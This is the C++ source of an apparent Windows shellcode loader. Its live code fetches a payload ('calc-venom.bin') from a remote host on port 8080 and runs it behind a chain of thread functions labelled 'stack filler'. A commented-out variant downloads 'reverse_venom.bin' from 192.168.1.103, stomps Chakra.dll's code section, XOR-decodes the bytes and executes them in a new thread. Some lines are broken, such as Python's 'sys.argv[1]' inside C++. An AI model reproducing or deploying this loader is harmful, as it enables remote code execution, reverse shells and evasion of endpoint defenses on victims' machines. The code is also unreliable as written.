#include <Windows.h>
#include <stdio.h>
#include "helperfuncs.h"
#include "AMS.h"
#include <vector>

//Stack Filler
DWORD WINAPI ExtraLevel10(LPVOID lpParameter) {
	printf("[+] Level 10 Complete. Starting AMS\n");
	return ExecuteWithAMS(sc);
}

DWORD WINAPI ExtraLevel9(LPVOID lpParameter) {
	printf("[+] Level 9 Complete.\n");
	return ExtraLevel10(lpParameter);
}
DWORD WINAPI ExtraLevel8(LPVOID lpParameter) {
	printf("[+] Level 8 Complete.\n");
	return ExtraLevel9(lpParameter);
}
DWORD WINAPI ExtraLevel7(LPVOID lpParameter) {
	printf("[+] Level 7 Complete.\n");
	return ExtraLevel8(lpParameter);
}
DWORD WINAPI ExtraLevel6(LPVOID lpParameter) {
	printf("[+] Level 6 Complete.\n");
	return ExtraLevel7(lpParameter);
}

DWORD WINAPI ExtraLevel5(LPVOID lpParameter) {
	printf("[+] Level 5 Complete.\n");
	return ExtraLevel6(lpParameter);
}

DWORD WINAPI ExtraLevel4(LPVOID lpParameter) {
	printf("[+] Level 4 Complete.\n");
	return ExtraLevel5(lpParameter);
}

DWORD WINAPI ExtraLevel3(LPVOID lpParameter) {
	printf("[+] Level 3 Complete.\n");
	return ExtraLevel4(lpParameter);
}

DWORD WINAPI ExtraLevel2(LPVOID lpParameter) {
	printf("[+] Level 2 Complete.\n");
	return ExtraLevel3(lpParameter);
}

DWORD WINAPI ExtraLevel1(LPVOID lpParameter) {
	printf("[+] Level 1 Complete.\n");
	return ExtraLevel2(lpParameter);
}


void main(){
	//Hardcoded values for testing
	sc = WebtoShellc(TEXT(sys.argv[1]), 8080, TEXT("calc-venom.bin"));
	HANDLE SparkPlug = CreateThread(nullptr, 1024 * 1024, (LPTHREAD_START_ROUTINE)ExtraLevel1, nullptr, 0, nullptr);
	WaitForSingleObject(SparkPlug, INFINITE);
	
	return;
}

































/*
void sleeee() {
	system("ping -n 63 127.0.0.1  > nul 2>&1");
}

void ObfSC(std::vector<BYTE> &sc, unsigned int key) {

	for (auto& byte : sc) { byte ^= key; }
}

void main() {
	std::vector<BYTE> sc = WebtoShellc(TEXT("192.168.1.103"), 8080, TEXT("reverse_venom.bin"));
	PIMAGE_DOS_HEADER DOS_head = (PIMAGE_DOS_HEADER)LoadLibraryExA("Chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
	PIMAGE_NT_HEADERS NT_head = (PIMAGE_NT_HEADERS)(((PBYTE)DOS_head) + DOS_head->e_lfanew);
	PIMAGE_SECTION_HEADER Txt = IMAGE_FIRST_SECTION(NT_head);

	PVOID pTxt = ((PBYTE)DOS_head) + Txt->VirtualAddress;
	DWORD SzTxt = Txt->Misc.VirtualSize;
	std::vector<BYTE> backup((BYTE*)pTxt, (BYTE*)pTxt + SzTxt);

	DWORD oldprot = 0;
	VirtualProtect(pTxt, SzTxt, PAGE_EXECUTE_READWRITE, &oldprot);
	memcpy(pTxt, sc.data(), sc.size());

	HANDLE t1 = CreateThread(nullptr, 0,(LPTHREAD_START_ROUTINE) sleeee, nullptr, 0, nullptr);
	WaitForSingleObject(t1, INFINITE);


	printf("Running Code..\n");
	PBYTE PBytes = (PBYTE)pTxt;
	for (size_t i = 0; i < sc.size(); i++) {
		PBytes[i] ^= 0xaa;
	}
	VirtualProtect(pTxt, SzTxt, PAGE_EXECUTE_READ, &oldprot);
	HANDLE t2 = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)pTxt, nullptr, CREATE_SUSPENDED, nullptr);
	ResumeThread(t2);
	WaitForSingleObject(t2, INFINITE);

	/**typedef void* (*vpexec)();
	vpexec exec = (vpexec)pTxt;
	exec();

printf("Done, Restoring PE.\n");
//VirtualProtect(pTxt, SzTxt, PAGE_EXECUTE_READWRITE, &oldprot);
//memcpy(pTxt, backup.data(), backup.size());
VirtualProtect(pTxt, SzTxt, PAGE_EXECUTE_READ, &oldprot);
printf("Restoration Complete.");
getchar();
**/
